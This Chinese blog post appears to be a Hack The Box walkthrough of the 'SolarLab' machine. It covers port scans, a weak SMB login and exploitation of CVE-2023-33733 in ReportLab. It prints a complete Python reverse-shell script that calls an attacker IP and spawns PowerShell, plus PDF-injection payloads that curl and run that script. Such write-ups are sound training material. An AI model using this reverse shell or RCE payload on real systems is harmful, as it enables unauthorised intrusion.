---
layout: post
title: HTB——SolarLab
---

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/SolarLab/01.png?raw=true)

# 0x01 信息收集

```bash
┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan Version: 2.0.0

[2025-04-09 02:36:08] [INFO] 暴力破解线程数: 1
[2025-04-09 02:36:08] [INFO] 开始信息扫描
[2025-04-09 02:36:08] [INFO] 最终有效主机数量: 1
[2025-04-09 02:36:08] [INFO] 开始主机扫描
[2025-04-09 02:36:08] [INFO] 有效端口数量: 233
[2025-04-09 02:36:08] [SUCCESS] 端口开放 10.129.55.36:80
[2025-04-09 02:36:08] [SUCCESS] 端口开放 10.129.55.36:135
[2025-04-09 02:36:08] [SUCCESS] 端口开放 10.129.55.36:139
[2025-04-09 02:36:08] [SUCCESS] 端口开放 10.129.55.36:445
[2025-04-09 02:36:11] [SUCCESS] 端口开放 10.129.55.36:7680
[2025-04-09 02:36:13] [SUCCESS] 服务识别 10.129.55.36:80 => [http] 版本:1.24.0 产品:nginx
[2025-04-09 02:36:13] [SUCCESS] 服务识别 10.129.55.36:139 =>  Banner:[.]
[2025-04-09 02:36:13] [SUCCESS] 服务识别 10.129.55.36:445 => 
[2025-04-09 02:36:26] [SUCCESS] 服务识别 10.129.55.36:7680 => 
[2025-04-09 02:37:13] [SUCCESS] 服务识别 10.129.55.36:135 => 
[2025-04-09 02:37:13] [INFO] 存活端口数量: 5
[2025-04-09 02:37:13] [INFO] 开始漏洞扫描
[2025-04-09 02:37:13] [INFO] 加载的插件: findnet, ms17010, netbios, smb, smb2, smbghost, webpoc, webtitle                                                                                         
[2025-04-09 02:37:14] [SUCCESS] 10.129.55.36 CVE-2020-0796 SmbGhost Vulnerable
[2025-04-09 02:37:14] [SUCCESS] 网站标题 http://10.129.55.36       状态码:301 长度:169    标题:301 Moved Permanently 重定向地址: http://solarlab.htb/                                             
[2025-04-09 02:37:14] [SUCCESS] NetInfo 扫描结果
目标主机: 10.129.55.36                                                                           
主机名: solarlab                                                                                 
发现的网络接口:                                                                                  
   IPv4地址:                                                                                     
      └─ 10.129.55.36                                                                            
[2025-04-09 02:37:17] [INFO] SMB2共享信息 10.129.55.36:445 admin Pass:123456 共享:[ADMIN$ C$ Documents IPC$]                                                                                      
[2025-04-09 02:37:48] [SUCCESS] SMB认证成功 10.129.55.36:445 admin:123456


 _____                             ___  _             
/__   \ ___   ___   __ _  _ __    / _ \| | _   _  ___ 
  / /\// __| / __| / _' || '_ \  / /_)/| || | | |/ __|
 / /   \__ \| (__ | (_| || | | |/ ___/ | || |_| |\__ \
 \/    |___/ \___| \__,_||_| |_|\/     |_| \__,_||___/

https://github.com/TideSec/TscanPlus
TscanClient Version: 2.7.4  NewVersion: 2.7.6  Expired: 2026.01.01
[02:41:04] [INFO] Start IpScan:10.129.55.36
[02:41:04] [INFO] 开始扫描 1 个主机的 65535 个端口，共 65535 个任务

[02:41:04] [+] 10.129.55.36:135 open
[02:41:04] [+] 10.129.55.36:80 open
[02:41:04] [+] 10.129.55.36:445 open
[02:41:04] [+] 10.129.55.36:139 open
[02:41:05] [+] [TCP/RPC]  [Microsoft Windows RPC] 10.129.55.36:135 [.@]
[02:41:05] [INFO] start WMI check 10.129.55.36:135
[02:41:05] [+] 开始 WmiExec 任务: WMI://10.129.55.36:135
[02:41:05] [+] [TCP/NETBIOS]  [Microsoft Windows netbios-ssn] 10.129.55.36:139 [.]
[02:41:05] [+] [TCP/HTTP] [200] [jQuery][nginx/1.24.0] http://10.129.55.36:80 [SolarLab Instant Messenger]
[02:41:09] [+] [TCP/MICROSOFT-DS]   10.129.55.36:445 
[02:41:09] [INFO] start SMB check 10.129.55.36:445
[02:41:09] [+] 开始 SmbScan 任务: SMB://10.129.55.36:445
[02:41:28] [+] 10.129.55.36:6791 open
[02:41:32] [+] [TCP/HTTP] [301] [nginx/1.24.0][Nginx 1.24.0] http://10.129.55.36:6791 [301 Moved Permanently]                                                                                     
端口扫描  81% [████████████████░░░░] (53633/65535) [2m42s:44s]
```

爆出了SMB的一个账密，意外之喜。我们先查看一下SMB内给什么了。

```bash
┌──(root㉿kali)-[/home/kali/HTB/SolarLab]
└─# smbclient //10.129.55.36/Documents -U admin 
Password for [WORKGROUP\admin]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Fri Apr 26 10:47:14 2024
  ..                                 DR        0  Fri Apr 26 10:47:14 2024
  concepts                            D        0  Fri Apr 26 10:41:57 2024
  desktop.ini                       AHS      278  Fri Nov 17 05:54:43 2023
  details-file.xlsx                   A    12793  Fri Nov 17 07:27:21 2023
  My Music                        DHSrn        0  Thu Nov 16 14:36:51 2023
  My Pictures                     DHSrn        0  Thu Nov 16 14:36:51 2023
  My Videos                       DHSrn        0  Thu Nov 16 14:36:51 2023
  old_leave_request_form.docx         A    37194  Fri Nov 17 05:35:57 2023

                7779839 blocks of size 4096. 1948161 blocks available
smb: \> mask ""
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
getting file \desktop.ini of size 278 as desktop.ini (0.8 KiloBytes/sec) (average 0.8 KiloBytes/sec)
getting file \details-file.xlsx of size 12793 as details-file.xlsx (35.1 KiloBytes/sec) (average 18.0 KiloBytes/sec)
getting file \old_leave_request_form.docx of size 37194 as old_leave_request_form.docx (84.3 KiloBytes/sec) (average 43.0 KiloBytes/sec)
getting file \concepts\Training-Request-Form.docx of size 161337 as concepts/Training-Request-Form.docx (293.9 KiloBytes/sec) (average 123.2 KiloBytes/sec)
getting file \concepts\Travel-Request-Sample.docx of size 30953 as concepts/Travel-Request-Sample.docx (88.6 KiloBytes/sec) (average 117.4 KiloBytes/sec)
```

查看下载下来的文件，`details-file.xlsx`文件内包含一些账密，收集下来等会做密码喷洒。先进`6791`端口的report子域名尝试登陆。这一步卡住了，看WP才知道是纯纯的guess。`blake`的登陆账户应该要写成`blakeb`。发现`leave request`模块用于生成PDF文件。生成后我们使用exiftools分析生成的PDF详细信息。

```bash
┌──(root㉿kali)-[/home/kali/HTB/SolarLab]
└─# exiftool output.pdf 
ExifTool Version Number         : 13.10
File Name                       : output.pdf
Directory                       : .
File Size                       : 252 kB
File Modification Date/Time     : 2025:04:09 03:16:11-04:00
File Access Date/Time           : 2025:04:09 03:18:36-04:00
File Inode Change Date/Time     : 2025:04:09 03:18:36-04:00
File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Author                          : (anonymous)
Create Date                     : 2025:04:09 06:14:00-02:00
Creator                         : (unspecified)
Modify Date                     : 2025:04:09 06:14:00-02:00
Producer                        : ReportLab PDF Library - www.reportlab.com
Subject                         : (unspecified)
Title                           : (anonymous)
Trapped                         : False
Page Mode                       : UseNone
Page Count                      : 1
```

---

# 0x02 CVE-2023-33733

其库为`reportlab pdf library`。翻找其CVE我们会发现一个RCE的`CVE-2023-33733`.我们先在本地创建一个文件r，并打开80端口服务。

```bash
import os, socket, subprocess, threading


def s2p(s, p):
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            p.stdin.write(data)
            p.stdin.flush()


def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.xx.xx", 9001))
p = subprocess.Popen(
    ["powershell"],
    stdout=subprocess.PIPE,
    stderr=subprocess.STDOUT,
    stdin=subprocess.PIPE,
)
s2p_thread = threading.Thread(target=s2p, args=[s, p])
s2p_thread.daemon = True
s2p_thread.start()
p2s_thread = threading.Thread(target=p2s, args=[s, p])
p2s_thread.daemon = True
p2s_thread.start()
try:
    p.wait()
except KeyboardInterrupt:
    s.close()
```

然后我们依次向服务器上的user_input传入以下代码，以触发漏洞

```bash
 <font color="[[getattr(pow,W('__globals__'))['os'].system('curl -o r 
10.10.xx.xx/r')for W in[O('W',(str,),{'M':1,'startswith':lambda 
s,x:0,'__eq__':lambda s,x:s.m()and s.M<0 and str(s)==x,'m':lambda s:
 {setattr(s,'M',s.M-1)},'__hash__':lambda s:hash(str(s))})]]for O 
in[type(type(1))]]and 'r'"/>

<font color="[[getattr(pow,W('__globals__'))['os'].system('python r')for W 
in[O('W',(str,),{'M':1,'startswith':lambda s,x:0,'__eq__':lambda s,x:s.m()and 
s.M<0 and str(s)==x,'m':lambda s:{setattr(s,'M',s.M-1)},'__hash__':lambda 
s:hash(str(s))})]]for O in[type(type(1))]]and 'r'"/>
```

我们就可以得到blake的shell了。

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/SolarLab/02.png?raw=true)